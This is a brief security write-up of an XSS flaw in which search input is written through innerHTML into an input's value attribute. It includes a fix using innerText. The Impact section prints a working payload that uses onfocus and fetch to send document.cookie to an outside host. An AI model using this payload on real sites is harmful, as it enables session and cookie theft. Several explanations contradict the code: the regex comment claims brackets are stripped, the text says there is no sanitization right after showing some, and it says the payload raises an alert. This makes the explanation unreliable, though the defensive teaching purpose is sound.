## Code Analysis
In this writeup, I'll analyze an XSS vulnerability discovered in the input field.

```javascript
userInput = userInput.replace(/[<>]/g, '');
// This replaces '<', '>', '[', and ']' with an empty string.
document.getElementById('result').innerHTML = `You searched for: <input type="text" value="${userInput}">`;
// This sets the innerHTML of the element with id 'result' to the value of the userInput.
// Here is the vulnerability. The value of the input field is set to the userInput without any sanitization.
```

## Impact
An attacker can inject malicious code into the input field and execute it in the context of the website.
An example of a payload that could be injected is: `" autofocus onfocus="fetch('https://vuln.me/?cookie=' + document.cookie)`
This payload would create an input field with the value `"` and autofocus on it, triggering an alert when the input field is focused.

## Solving the Issue
For this case, the issue can be solved by using the `innerText` property instead of `innerHTML` to set the value of the input field.
```javascript
document.getElementById('result').innerText = `You searched for: ${userInput}`;
```

## Conclusion
This case study demonstrates the importance of properly sanitizing user input to prevent XSS attacks.
